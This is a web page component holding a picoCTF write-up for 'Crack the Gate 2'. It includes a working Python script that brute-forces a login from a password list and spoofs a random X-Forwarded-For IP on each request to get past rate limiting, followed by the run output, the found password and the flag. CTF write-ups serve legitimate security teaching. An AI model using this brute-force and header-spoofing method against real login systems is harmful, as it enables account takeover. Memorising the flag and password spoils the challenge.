import Image from 'next/image'

export default function CrackTheGate2() {
  return (
    <div className="space-y-8">
      {/* Header Section */}
      <div className="bg-gradient-to-r from-orange-50 to-red-100 rounded-2xl p-8 border-l-4 border-orange-500">
        <h1 className="text-4xl font-bold text-gray-900 mb-4">Crack the Gate 2</h1>
        <p className="text-xl text-gray-700 leading-relaxed">
          The login system has been upgraded with a basic rate-limiting mechanism that locks out repeated failed attempts from the same source. 
          We've received a tip that the system might still trust user-controlled headers.
        </p>
      </div>

      {/* Information Section */}
      <div className="bg-white rounded-xl shadow-lg p-8 border border-gray-200">
        <h2 className="text-3xl font-bold text-blue-900 mb-6 border-l-4 border-blue-500 pl-4">Information Given</h2>
        
        <div className="space-y-6">
          <div>
            <h3 className="text-2xl font-bold text-green-700 mb-4">Description</h3>
            <p className="text-gray-700 leading-relaxed text-lg">
              The login system has been upgraded with a basic rate-limiting mechanism that locks out repeated failed attempts from the same source. 
              We've received a tip that the system might still trust user-controlled headers. Your objective is to bypass the rate-limiting restriction 
              and log in using the known email address: <code className="bg-red-100 text-red-800 px-2 py-1 rounded font-mono ml-2">ctf-player@picoctf.org</code> 
              and uncover the hidden secret.
            </p>
            <p className="mt-4 text-gray-600">
              Additional details will be available after launching your challenge instance.
            </p>
          </div>

          <div>
            <h3 className="text-2xl font-bold text-green-700 mb-4">Hints</h3>
            <ul className="space-y-2 text-gray-700">
              <li>• What IP does the server think you're coming from?</li>
              <li>• Read more about <a href="https://www.typeerror.org/docs/http/headers/x-forwarded-for" className="text-blue-600 hover:text-blue-800 font-semibold" target="_blank" rel="noopener noreferrer">X-forwarded-For</a></li>
              <li>• You can rotate fake IPs to bypass rate limits.</li>
            </ul>
          </div>
        </div>
      </div>

      {/* Python Script Section */}
      <div className="bg-gradient-to-br from-gray-900 to-gray-800 rounded-xl p-8 text-green-400 shadow-2xl">
        <h2 className="text-3xl font-bold text-white mb-6">Python Solve Script</h2>
        
        <div className="space-y-6">
          <p className="text-green-300 text-lg">
            We are also given a <code className="bg-gray-700 text-yellow-300 px-2 py-1 rounded">passwords.txt</code> file:
          </p>
          
          <div className="bg-gray-800 rounded-lg p-6">
            <pre className="text-green-400 font-mono text-sm">
{`o8GijNLh
FxmTBRic
PE4KtqXe
5Tec2YXd
aDbsDtO9
wSfCgTKV
jaOwWyI1
3HEQWIU0
EI528AbD
Dc7E3bM2
A9q6Ww68
MCpeUa3f
ljqkyqNf
Fbn8zYwV
bfSwplYv
qTmOzEej
jW6RWYbR
xgmwDQ3I
NITi7pqd
KANstcT2`}
            </pre>
          </div>
          
          <p className="text-green-300 text-lg">
            Make sure that file is in the same directory as your python file:
          </p>
          
          <div className="bg-gray-800 rounded-lg p-6 overflow-x-auto">
            <pre className="text-green-400 font-mono text-sm">
{`#!/usr/bin/env python3

import requests, random, json

TARGET = "http://amiable-citadel.picoctf.net:57333/login"
EMAIL = "ctf-player@picoctf.org"
PWFILE = "passwords.txt"

def rand_ip():
    return "{}.{}.{}.{}".format(random.randint(1,223), random.randint(0,255), random.randint(0,255), random.randint(0,255))

with open(PWFILE, 'r') as f:
    for line in f:
        pw = line.strip()
        if not pw:
            continue
        headers = {
            "X-Forwarded-For": rand_ip(),
            "User-Agent": "CTF-Checker",
            "Content-Type": "application/json"
        }
        payload = {"email": EMAIL, "password": pw}
        r = requests.post(TARGET, headers=headers, json=payload, timeout=10)
        try:
            j = r.json()
        except Exception:
            print("non-json response:", r.text)
            continue
        print("try", pw, "->", j)
        if j.get("success"):
            print("FOUND!", pw)
            print("FLAG:", j.get("flag"))
            break`}
            </pre>
          </div>
        </div>
      </div>

      {/* Exploitation Section */}
      <div className="bg-white rounded-xl shadow-lg p-8 border border-gray-200">
        <h2 className="text-3xl font-bold text-blue-900 mb-6 border-l-4 border-blue-500 pl-4">Exploitation</h2>
        <div className="bg-gradient-to-br from-gray-900 to-gray-800 rounded-xl p-6 text-green-400 font-mono shadow-2xl">
          <div className="space-y-2">
            <div><code>siddharthsehgal@mac junk % /usr/local/bin/python3 new_exploit.py</code></div>
            <div><code>try o8GijNLh -&gt; {'{'}success: False{'}'}</code></div>
            <div><code>try FxmTBRic -&gt; {'{'}success: False{'}'}</code></div>
            <div><code>try PE4KtqXe -&gt; {'{'}success: False{'}'}</code></div>
            <div><code>try 5Tec2YXd -&gt; {'{'}success: False{'}'}</code></div>
            <div><code>try aDbsDtO9 -&gt; {'{'}success: False{'}'}</code></div>
            <div><code>try wSfCgTKV -&gt; {'{'}success: False{'}'}</code></div>
            <div><code>try jaOwWyI1 -&gt; {'{'}success: False{'}'}</code></div>
            <div><code>try 3HEQWIU0 -&gt; {'{'}success: False{'}'}</code></div>
            <div><code>try EI528AbD -&gt; {'{'}success: False{'}'}</code></div>
            <div><code>try Dc7E3bM2 -&gt; {'{'}success: True, email: 'ctf-player@picoctf.org', firstName: 'pico', lastName: 'player', flag: '{"picoCTF{" + "xff_byp4ss_brut3_f6cca7d4" + "}"}'{'}'}</code></div>
            <div className="text-yellow-300"><code>FOUND! Dc7E3bM2</code></div>
            <div className="text-yellow-300"><code>FLAG: {"picoCTF{" + "xff_byp4ss_brut3_f6cca7d4" + "}"}</code></div>
          </div>
        </div>
        <p className="mt-4 text-gray-700">
          So the flag is: <code className="bg-gray-100 text-gray-800 px-2 py-1 rounded font-mono">{"picoCTF{" + "xff_byp4ss_brut3_f6cca7d4" + "}"}</code>
        </p>
      </div>

      {/* Flag Section */}
      <div className="bg-gradient-to-r from-green-50 to-emerald-50 rounded-xl p-8 border-l-4 border-green-500">
        <h2 className="text-3xl font-bold text-green-800 mb-6">The Flag</h2>
        <div className="bg-gradient-to-r from-green-600 to-emerald-600 text-white p-6 rounded-xl font-mono text-xl font-bold shadow-lg">
          {"picoCTF{" + "'{'" + "}"}xff_byp4ss_brut3_f6cca7d4{'}'}
        </div>
      </div>
    </div>
  )
}
